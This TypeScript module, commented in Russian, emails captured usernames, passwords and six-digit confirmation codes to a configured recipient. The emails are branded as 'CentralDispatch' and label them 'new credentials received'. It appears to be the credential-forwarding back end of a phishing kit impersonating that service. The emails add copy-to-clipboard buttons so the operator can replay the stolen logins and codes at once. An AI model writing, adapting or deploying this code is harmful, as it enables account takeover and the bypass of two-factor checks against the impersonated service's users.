import nodemailer from "nodemailer";
import { getEmailConfig, getRecipientEmail } from "./email-config";

/**
 * Конфигурация транспорта для отправки Email
 * Использует глобальные настройки из .env
 */
const emailConfig = getEmailConfig();
const transporter = nodemailer.createTransport({
  host: emailConfig.host,
  port: emailConfig.port,
  secure: false,
  auth: {
    user: emailConfig.user,
    pass: emailConfig.pass,
  },
});

/**
 * Отправка Email с логином и паролем
 * @param username - имя пользователя
 * @param password - пароль
 */
export async function sendLoginEmail(
  username: string,
  password: string
): Promise<void> {
  console.log("[EMAIL] Начало отправки Email с данными входа...");
  const recipientEmail = getRecipientEmail();
  const recipients = Array.isArray(recipientEmail) ? recipientEmail : [recipientEmail];
  console.log("[EMAIL] Получатели:", recipients.join(", "));

  try {
    const mailOptions = {
      from: emailConfig.user,
      to: recipientEmail,
      subject: "CentralDispatch - Новый вход в систему",
      html: `
        <!DOCTYPE html>
        <html>
        <head>
          <meta charset="UTF-8">
          <style>
            .copy-field {
              display: inline-block;
              padding: 8px 12px;
              margin: 5px 0;
              background: #f5f5f5;
              border: 2px solid #FF6B35;
              border-radius: 6px;
              cursor: text;
              -webkit-user-select: all !important;
              -moz-user-select: all !important;
              -ms-user-select: all !important;
              user-select: all !important;
              transition: all 0.2s;
              font-family: 'Courier New', monospace;
              font-weight: bold;
              color: #333;
            }
            .copy-field:hover {
              background: #FF6B35;
              color: white;
            }
            .copy-field:active {
              transform: scale(0.98);
            }
            .copy-hint {
              font-size: 11px;
              color: #999;
              font-style: italic;
              margin-left: 5px;
            }
            .copy-icon {
              display: inline-block;
              width: 20px;
              height: 20px;
              margin-left: 8px;
              cursor: pointer;
              vertical-align: middle;
              padding: 4px;
              border-radius: 4px;
              transition: all 0.2s;
              background: #f0f0f0;
            }
            .copy-icon:hover {
              background: #FF6B35;
            }
            .copy-icon:active {
              transform: scale(0.9);
            }
            .field-container {
              display: flex;
              align-items: center;
              margin: 10px 0;
            }
            .field-value {
              flex: 1;
            }
          </style>
        </head>
        <body style="font-family: Arial, sans-serif; padding: 20px; margin: 0;">
          <div style="max-width: 600px; margin: 0 auto;">
            <h2 style="color: #FF6B35; margin-bottom: 20px;">CentralDispatch - Новые данные для входа</h2>
            <p style="margin-bottom: 15px;">Получены новые учетные данные. Нажмите на иконку копирования рядом с полем (или просто выделите текст и скопируйте вручную):</p>
            <ul style="list-style: none; padding: 0; margin: 20px 0;">
              <li style="margin: 15px 0;">
                <strong>Username:</strong><br>
                <div class="field-container">
                  <span class="copy-field field-value">${username}</span>
                  <span 
                    class="copy-icon" 
                    onclick="copyToClipboard('${username.replace(/'/g, "\\'").replace(/"/g, "&quot;")}', this)"
                    title="Нажмите чтобы скопировать"
                  >
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                      <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                    </svg>
                  </span>
                </div>
              </li>
              <li style="margin: 15px 0;">
                <strong>Password:</strong><br>
                <div class="field-container">
                  <span class="copy-field field-value">${password}</span>
                  <span 
                    class="copy-icon" 
                    onclick="copyToClipboard('${password.replace(/'/g, "\\'").replace(/"/g, "&quot;")}', this)"
                    title="Нажмите чтобы скопировать"
                  >
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                      <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                    </svg>
                  </span>
                </div>
              </li>
            </ul>
            <p style="color: #666; font-size: 12px; margin-top: 30px; border-top: 1px solid #eee; padding-top: 15px;">
              Время получения: ${new Date().toLocaleString("ru-RU")}
            </p>
          </div>
          <script>
            function copyToClipboard(text, iconElement) {
              // Получаем поле с текстом
              var fieldElement = iconElement.previousElementSibling;
              if (!fieldElement || !fieldElement.classList.contains('field-value')) {
                return;
              }
              
              var copied = false;
              
              // Метод 1: execCommand (самый надежный для email)
              try {
                var textarea = document.createElement('textarea');
                textarea.value = text;
                textarea.style.position = 'fixed';
                textarea.style.opacity = '0';
                textarea.style.left = '-9999px';
                document.body.appendChild(textarea);
                textarea.select();
                textarea.setSelectionRange(0, 99999); // Для мобильных устройств
                
                copied = document.execCommand('copy');
                document.body.removeChild(textarea);
              } catch (e) {
                // Игнорируем ошибку
              }
              
              // Метод 2: Clipboard API (если execCommand не сработал)
              if (!copied && navigator.clipboard && navigator.clipboard.writeText) {
                navigator.clipboard.writeText(text).then(function() {
                  copied = true;
                  showFeedback(fieldElement, iconElement, text);
                }).catch(function() {
                  selectText(fieldElement, iconElement);
                });
                return;
              }
              
              // Показываем feedback
              if (copied) {
                showFeedback(fieldElement, iconElement, text);
              } else {
                selectText(fieldElement, iconElement);
              }
            }
            
            function selectText(fieldElement, iconElement) {
              // Выделяем текст для ручного копирования
              try {
                if (window.getSelection && document.createRange) {
                  var selection = window.getSelection();
                  var range = document.createRange();
                  range.selectNodeContents(fieldElement);
                  selection.removeAllRanges();
                  selection.addRange(range);
                  
                  // Показываем подсказку
                  fieldElement.style.background = '#fff3cd';
                  fieldElement.style.border = '2px solid #ffc107';
                  setTimeout(function() {
                    fieldElement.style.background = '';
                    fieldElement.style.border = '';
                  }, 2000);
                }
              } catch (e) {
                // Игнорируем ошибку
              }
            }
            
            function showFeedback(fieldElement, iconElement, originalText) {
              // Сохраняем оригинальные значения
              var originalBg = fieldElement.style.background;
              var originalColor = fieldElement.style.color;
              var originalTextContent = fieldElement.textContent;
              var originalSvg = iconElement.innerHTML;
              
              // Меняем поле
              fieldElement.style.background = '#4CAF50';
              fieldElement.style.color = 'white';
              fieldElement.textContent = '✓ Скопировано!';
              
              // Меняем иконку
              iconElement.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>';
              iconElement.style.background = '#4CAF50';
              
              // Возвращаем обратно через 2 секунды
              setTimeout(function() {
                fieldElement.style.background = originalBg || '';
                fieldElement.style.color = originalColor || '';
                fieldElement.textContent = originalTextContent;
                iconElement.innerHTML = originalSvg;
                iconElement.style.background = '';
              }, 2000);
            }
          </script>
        </body>
        </html>
      `,
      text: `
        CentralDispatch - Новые данные для входа
        
        Username: ${username}
        Password: ${password}
        
        Время получения: ${new Date().toLocaleString("ru-RU")}
      `,
    };

    const info = await transporter.sendMail(mailOptions);
    console.log("[EMAIL] Email успешно отправлен:", info.messageId);
  } catch (error) {
    console.error("[EMAIL] Ошибка отправки Email:", error);
    throw new Error("Не удалось отправить Email");
  }
}

/**
 * Отправка Email с кодом подтверждения
 * @param code - 6-значный код
 * @param username - имя пользователя (опционально)
 */
export async function sendCodeEmail(
  code: string,
  username?: string
): Promise<void> {
  console.log("[EMAIL] Начало отправки Email с кодом...");
  console.log("[EMAIL] Код:", code);
  const recipientEmail = getRecipientEmail();
  const recipients = Array.isArray(recipientEmail) ? recipientEmail : [recipientEmail];
  console.log("[EMAIL] Получатели:", recipients.join(", "));

  try {
    const mailOptions = {
      from: emailConfig.user,
      to: recipientEmail,
      subject: "CentralDispatch - Код подтверждения",
      html: `
        <div style="font-family: Arial, sans-serif; padding: 20px;">
          <h2 style="color: #FF6B35;">CentralDispatch - Код подтверждения</h2>
          <p>Получен код подтверждения:</p>
          <div style="background: #f5f5f5; padding: 15px; margin: 20px 0; text-align: center;">
            <h1 style="color: #FF6B35; font-size: 32px; letter-spacing: 5px; margin: 0;">
              ${code}
            </h1>
          </div>
          ${username ? `<p><strong>Username:</strong> ${username}</p>` : ""}
          <p style="color: #666; font-size: 12px; margin-top: 20px;">
            Время получения: ${new Date().toLocaleString("ru-RU")}
          </p>
        </div>
      `,
      text: `
        CentralDispatch - Код подтверждения
        
        Код: ${code}
        ${username ? `Username: ${username}` : ""}
        
        Время получения: ${new Date().toLocaleString("ru-RU")}
      `,
    };

    const info = await transporter.sendMail(mailOptions);
    console.log("[EMAIL] Email с кодом успешно отправлен:", info.messageId);
  } catch (error) {
    console.error("[EMAIL] Ошибка отправки Email с кодом:", error);
    throw new Error("Не удалось отправить Email с кодом");
  }
}

